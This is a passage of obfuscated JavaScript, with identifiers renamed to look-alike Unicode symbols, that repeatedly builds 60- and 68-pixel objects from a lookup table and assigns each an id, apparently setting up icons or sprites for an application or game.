			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔΔΔᐃ].id = ᐃᐃⲆ.ΔΔΔΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃᐃⲆⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔΔⵠᐃ].id = ᐃᐃⲆ.ΔΔΔⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠⵠᐃᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⲆⵠ].id = ᐃᐃⲆ.ⵠⵠᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⵠΔΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠΔⵠΔ].id = ᐃᐃⲆ.ΔⵠΔⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆΔⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔᐃⲆᐃ].id = ᐃᐃⲆ.ⲆΔᐃⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⵠⵠᐃⲆ], ⵠⵠⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔⲆΔ].id = ᐃᐃⲆ.ⲆⵠΔⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⵠΔⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⵠⵠᐃ].id = ᐃᐃⲆ.ᐃⵠⵠⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔⲆⲆⵠⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆΔⲆᐃ].id = ᐃᐃⲆ.ΔⲆΔⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⵠⵠⲆᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔΔⵠ].id = ᐃᐃⲆ.ⲆⵠΔΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔΔⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆⵠⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔΔⲆⵠ].id = ᐃᐃⲆ.ⵠΔΔⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⵠΔⵠᐃ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔΔⵠ].id = ᐃᐃⲆ.ᐃᐃΔΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠⵠΔⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆΔᐃ].id = ᐃᐃⲆ.ΔᐃⲆΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠΔⲆⲆΔ], ⵠⵠⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔⲆⲆ].id = ᐃᐃⲆ.ⲆⵠΔⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⵠⲆⵠᐃᐃ], ΔⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠⵠⲆ].id = ᐃᐃⲆ.ⲆᐃⵠⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃⲆᐃ].id = ᐃᐃⲆ.ⵠⲆᐃⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠᐃ], ᐃⲆᐃᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃⵠⲆ].id = ᐃᐃⲆ.ⲆⵠᐃⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃᐃΔ].id = ᐃᐃⲆ.ᐃⵠᐃᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔⵠΔⲆ], ᐃⲆᐃᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃⲆⲆᐃ].id = ᐃᐃⲆ.ᐃᐃⲆⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠⵠⵠⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃᐃᐃ].id = ᐃᐃⲆ.ⵠⲆᐃᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆΔⲆⵠⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠⵠⵠⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆΔⲆⵠⲆΔ].id = ᐃᐃⲆ.ᐃⲆΔⲆⵠⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⲆⲆΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠⵠⵠⲆᐃ], ⵠⲆΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⲆⲆΔⵠᐃ].id = ᐃᐃⲆ.ΔⲆⲆⲆΔⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⵠΔΔⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⵠΔᐃ].id = ᐃᐃⲆ.ΔⵠⵠΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆΔᐃ], ⵠΔΔΔΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⲆⵠΔ].id = ᐃᐃⲆ.ΔΔⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆΔⲆⲆΔ], ⲆΔⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔΔᐃ].id = ᐃᐃⲆ.ⵠᐃΔΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠᐃⵠᐃⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⲆΔ].id = ᐃᐃⲆ.ⵠᐃᐃⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔᐃⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃΔⵠⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔᐃⲆΔ].id = ᐃᐃⲆ.ΔΔᐃⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃⵠᐃ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆᐃⵠ].id = ᐃᐃⲆ.ⵠᐃⲆᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆΔⵠ], ⵠⲆΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆΔⲆ].id = ᐃᐃⲆ.ⲆⵠⲆΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠᐃⵠ], ⵠⲆΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆᐃᐃ].id = ᐃᐃⲆ.ΔⵠⲆᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔⲆᐃⵠⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⲆᐃᐃ].id = ᐃᐃⲆ.ΔΔⲆᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⲆⵠΔⵠᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃΔⲆ].id = ᐃᐃⲆ.ΔⵠᐃΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠΔⲆ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆΔΔⵠ].id = ᐃᐃⲆ.ᐃⲆΔΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠⲆⲆᐃⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆⵠⵠ].id = ᐃᐃⲆ.ⵠⲆⲆⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠΔΔΔΔ], ⵠⵠⵠᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔⲆᐃ].id = ᐃᐃⲆ.ⲆΔΔⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔⵠⲆΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⵠΔⲆ].id = ᐃᐃⲆ.ⲆΔⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.Ⲇⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.Ⲇⵠᐃᐃⵠ].id = ᐃᐃⲆ.Ⲇⵠᐃᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠⲆᐃΔ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔⲆⲆ].id = ᐃᐃⲆ.ⵠᐃΔⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠᐃⲆⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃⲆⵠ].id = ᐃᐃⲆ.ⲆⵠᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃᐃⵠΔΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⵠⵠ].id = ᐃᐃⲆ.ΔⵠⲆⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⵠΔⵠⵠⵠ], ᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆⲆⵠ].id = ᐃᐃⲆ.ⵠᐃⲆⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔΔΔᐃⲆ], ⵠⵠⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆⲆᐃⲆ].id = ᐃᐃⲆ.ᐃⲆⲆᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.Ⲇⵠᐃⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆΔΔⲆⵠⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.Ⲇⵠᐃⵠⵠ].id = ᐃᐃⲆ.Ⲇⵠᐃⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⵠⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠΔⲆⵠᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⵠⲆⲆ].id = ᐃᐃⲆ.ᐃΔⵠⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠᐃΔⲆΔΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃᐃΔΔ].id = ᐃᐃⲆ.ΔᐃᐃΔΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃΔΔ].id = ᐃᐃⲆ.ⲆⵠᐃΔΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠⲆ], ΔⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔⲆᐃ].id = ᐃᐃⲆ.ⲆⲆΔⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔⵠⲆᐃᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆᐃⲆ].id = ᐃᐃⲆ.ᐃΔⲆᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃᐃΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃᐃᐃⲆⵠ], ⲆΔⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃᐃΔᐃ].id = ᐃᐃⲆ.ΔᐃᐃΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⵠⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⵠⵠΔ].id = ᐃᐃⲆ.ΔⵠⵠⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.Δⵠⵠⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⵠΔΔΔⵠ], ΔΔᐃΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.Δⵠⵠⵠⵠ].id = ᐃᐃⲆ.Δⵠⵠⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆᐃΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆΔⵠⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆᐃΔⵠ].id = ᐃᐃⲆ.ΔⲆᐃΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃΔⲆΔⲆ], ΔⲆᐃⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃⲆᐃ].id = ᐃᐃⲆ.ᐃⵠᐃⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠΔⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃΔⵠ], ᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠΔⲆⵠ].id = ᐃᐃⲆ.ⵠⵠΔⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆⵠⲆ].id = ᐃᐃⲆ.ⵠⲆⲆⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆⵠⵠⵠΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆᐃⵠ].id = ᐃᐃⲆ.ⵠΔⲆᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆΔᐃᐃΔ], ᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⵠⲆ].id = ᐃᐃⲆ.ⵠⵠᐃⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔΔⵠΔᐃ], ⵠⵠⵠᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆᐃΔ].id = ᐃᐃⲆ.ⵠΔⲆᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃⲆⲆ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆᐃⵠ].id = ᐃᐃⲆ.ΔᐃⲆᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔᐃⵠⲆᐃ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⵠⵠⲆ].id = ᐃᐃⲆ.ᐃΔⵠⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆⲆⵠⲆⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆⲆΔ].id = ᐃᐃⲆ.ΔᐃⲆⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠᐃΔΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠΔⲆ].id = ᐃᐃⲆ.ⲆⲆⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃⲆⵠ], ᐃⲆᐃᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠᐃⵠ].id = ᐃᐃⲆ.ⲆⲆⵠᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔᐃᐃ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔⲆΔ].id = ᐃᐃⲆ.ᐃᐃΔⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠᐃⵠⲆΔ], ΔⲆᐃⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⲆⲆΔ].id = ᐃᐃⲆ.ⲆⲆⲆⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆᐃⵠᐃΔ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⲆⲆⲆ].id = ᐃᐃⲆ.ΔⲆⲆⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⵠⲆⵠⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆᐃᐃ].id = ᐃᐃ.ᐃΔⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆᐃᐃ].id = ᐃᐃ.ᐃΔⲆᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⲆᐃⵠⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆᐃᐃ].id = ᐃᐃⲆ.ᐃΔⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆⵠᐃᐃΔⲆ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⵠΔ].id = ᐃᐃ.ⵠΔᐃⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⵠΔ].id = ᐃᐃ.ⵠΔᐃⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⵠⲆΔΔΔ], ⲆᐃΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔᐃⵠΔ].id = ᐃᐃⲆ.ⵠΔᐃⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆΔⵠΔⵠⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠᐃⵠ].id = ᐃᐃ.ΔΔⵠᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠᐃⵠ].id = ᐃᐃ.ΔΔⵠᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔΔⲆⲆᐃⲆ], ⵠᐃⵠⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠᐃⵠ].id = ᐃᐃⲆ.ΔΔⵠᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⵠⵠ], ⵠᐃⵠⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠΔⵠ].id = ᐃᐃ.ⵠⲆⵠΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠΔⵠ].id = ᐃᐃ.ⵠⲆⵠΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⵠΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⵠΔⵠ].id = ᐃᐃⲆ.ⵠⲆⵠΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔⵠΔΔΔΔ], ᐃⲆᐃᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ].id = ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔⲆⲆΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ].id = ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⵠⲆᐃ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⵠᐃ].id = ᐃᐃ.ⵠΔᐃⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⵠᐃ].id = ᐃᐃ.ⵠΔᐃⵠᐃ;
